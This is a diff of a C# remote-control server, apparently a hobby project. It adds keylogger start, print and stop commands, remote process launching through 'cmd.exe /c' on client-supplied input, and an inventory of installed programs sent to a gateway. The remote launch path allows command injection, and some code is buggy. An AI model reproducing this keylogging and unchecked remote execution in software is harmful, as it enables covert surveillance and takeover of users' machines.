@@ -24,6 +24,8 @@ namespace Server
         static readonly object SendLock = new();
         static CancellationTokenSource? ProcessMonitorCTS = null;
         static CancellationTokenSource? ApplicationMonitorCTS = null;
+        static readonly KeyLogger KeyLogger = new KeyLogger();
+        static Dictionary<string, string> StartableApplications = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
 
         static async Task Main()
         {
@@ -55,7 +57,7 @@ namespace Server
                 Client.OnConnected += async (Sender, E) =>
                 {
                     Console.WriteLine("Server > Connected to Gateway");
-                    await Client.EmitAsync("Server:Register", new { IP = "127.0.0.1", Port = "8080" }); // IP/Port might be irrelevant now but keeping for protocol
+                    await Client.EmitAsync("Server:Register", new { IP = "127.0.0.1", Port = "8080" });
                 };
 
                 Client.OnDisconnected += (Sender, E) =>
@@ -66,6 +68,7 @@ namespace Server
                 Client.On("Server:Connect:Success", Response =>
                 {
                     var Data = Response.GetValue<dynamic>();
+                    GetStartableApplication(SendData);
                     Console.WriteLine("Server > Client connected via Gateway" + Data.ClientID);
                 });
 
@@ -74,22 +77,24 @@ namespace Server
                     Console.WriteLine("Server > Client disconnected via Gateway");
                 });
 
-                Client.On("Server:Connect", Response =>
-                {
-                    Console.WriteLine("Server > Client connected via Gateway");
-                });
-
                 Client.On("Server:Disconnect", Response =>
                 {
                     Console.WriteLine("Server > Client disconnected via Gateway");
                     StopProcessMonitor();
                     StopApplicationMonitor();
+                    KeyLogger.StopKeyLogger();
                 });
 
                 Client.On("Process:Kill", Response =>
                 {
                     int PID = Response.GetValue<int>();
-                    KillProcess(PID);
+                    KillProcess(PID, SendData);
+                });
+
+                Client.On("Process:Start", Response =>
+                {
+                    string Input = Response.GetValue<string>();
+                    StartProcess(Input, SendData);
                 });
 
                 Client.On("Process:Subscribe", Response =>
@@ -114,6 +119,24 @@ namespace Server
                 {
                     Console.WriteLine("Server > Client unsubscribed from app updates.");
                     StopApplicationMonitor();
+                });
+
+                Client.On("KeyLogger:Start", Response =>
+                {
+                    Console.WriteLine("Server > Client requested keylogger start.");
+                    KeyLogger.StartKeyLogger(SendData);
+                });
+
+                Client.On("KeyLogger:Print", Response =>
+                {
+                    Console.WriteLine("Server > Client requested keylogger print.");
+                    KeyLogger.PrintKeyLogger();
+                });
+
+                Client.On("KeyLogger:Stop", Response =>
+                {
+                    Console.WriteLine("Server > Client requested keylogger stop.");
+                    KeyLogger.StopKeyLogger();
                 });
 
                 Client.On("Screenshot:Take", Response =>
@@ -171,7 +194,6 @@ namespace Server
 
                 await Task.Delay(-1);
             }
-
         }
 
         static void SendData(string EventName, object Data)
@@ -192,18 +214,132 @@ namespace Server
             }
         }
 
-        static void KillProcess(int PID)
+        static void KillProcess(int PID, Action<string, object> Callback)
         {
+            var _Process = Process.GetProcessById(PID);
             try
             {
-                var _Process = Process.GetProcessById(PID);
-                _Process.Kill();
-                Console.WriteLine($"Server > Killed process {_Process.ProcessName}");
+                _Process.Kill(true);
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"Server > Failed to kill process {PID}: {ex.Message}");
+                Callback("Process:Killed", new
+                {
+                    Status = "Failed",
+                    PID = PID,
+                    ProcessName = "_Process.ProcessName"
+                });
+                return;
             }
+            Console.WriteLine($"Server > Killed process {_Process.ProcessName}");
+            Callback("Process:Killed", new
+            {
+                Status = "Success",
+                PID = PID,
+                ProcessName = _Process.ProcessName
+            });
+        }
+
+        static void StartProcess(string Input, Action<string, object> Callback)
+        {
+            if (string.IsNullOrWhiteSpace(Input))
+                return;
+
+            string ApplicationPath = StartableApplications[Input];
+            Console.WriteLine(ApplicationPath);
+            try
+            {
+                Process.Start("cmd.exe", "/c " + "\"" + (string.IsNullOrWhiteSpace(ApplicationPath) ? Input : ApplicationPath) + "\"");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Server > Failed to start process {Input}: {ex.Message}");
+                Callback("Process:Started", new
+                {
+                    Status = "Failed",
+                    Name = Input
+                });
+                return;
+            }
+            Console.WriteLine($"Server > Started process {Input}");
+            Callback("Process:Started", new
+            {
+                Status = "Success",
+                Name = Input
+            });
+        }
+
+        static void GetStartableApplication(Action<string, object> Callback)
+        {
+            string CommonStart = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu);
+            string UserStart = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
+
+            string[] MenuFolders =
+            {
+                Path.Combine(CommonStart, "Programs"),
+                Path.Combine(UserStart, "Programs")
+            };
+
+            foreach (var Folder in MenuFolders)
+            {
+                if (!Directory.Exists(Folder)) continue;
+
+                foreach (var Lnk in Directory.EnumerateFiles(Folder, "*.lnk", SearchOption.AllDirectories))
+                {
+                    string Name = Path.GetFileNameWithoutExtension(Lnk);
+                    if (!string.IsNullOrWhiteSpace(Name))
+                    {
+                        string TargetPath = "";
+                        try
+                        {
+                            TargetPath = GetShortcutTarget(Lnk);
+                        }
+                        catch
+                        {
+                            TargetPath = "";
+                        }
+
+                        StartableApplications[Name] = TargetPath;
+                    }
+                }
+            }
+
+            // Scan registry uninstall entries
+            string[] uninstallKeys =
+            {
+                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+            };
+
+            foreach (var Root in new[] { Registry.LocalMachine, Registry.CurrentUser })
+            {
+                foreach (var Path in uninstallKeys)
+                {
+                    using var Key = Root.OpenSubKey(Path);
+                    if (Key == null) continue;
+
+                    foreach (string Sub in Key.GetSubKeyNames())
+                    {
+                        using var SubKey = Key.OpenSubKey(Sub);
+                        if (SubKey == null) continue;
+
+                        string? DisplayName = SubKey.GetValue("DisplayName") as string;
+                        if (!string.IsNullOrWhiteSpace(DisplayName))
+                        {
+                            if (!StartableApplications.ContainsKey(DisplayName))
+                                StartableApplications[DisplayName] = "";
+                        }
+                    }
+                }
+            }
+
+            var formatted = StartableApplications
+                .OrderBy(x => x.Key)
+                .Select(x => new { Name = x.Key, Path = x.Value })
+                .ToArray();
+
+            Callback("Application:Startable", formatted);
         }
 
         static void Record(int Duration, Action<string, object> Callback)
@@ -467,6 +603,25 @@ namespace Server
         static void ControllerLock()
         {
             NativeMethods.LockWorkStation();
+        }
+
+        static string GetShortcutTarget(string shortcutPath)
+        {
+            try
+            {
+                Type? WshShellType = Type.GetTypeFromProgID("WScript.Shell");
+                if (WshShellType == null)
+                    return "";
+
+                dynamic Shell = Activator.CreateInstance(WshShellType)!;
+                dynamic Shortcut = Shell.CreateShortcut(shortcutPath);
+                string? Target = Shortcut.TargetPath;
+                return Target ?? "";
+            }
+            catch
+            {
+                return "";
+            }
         }
 
         static class NativeMethods
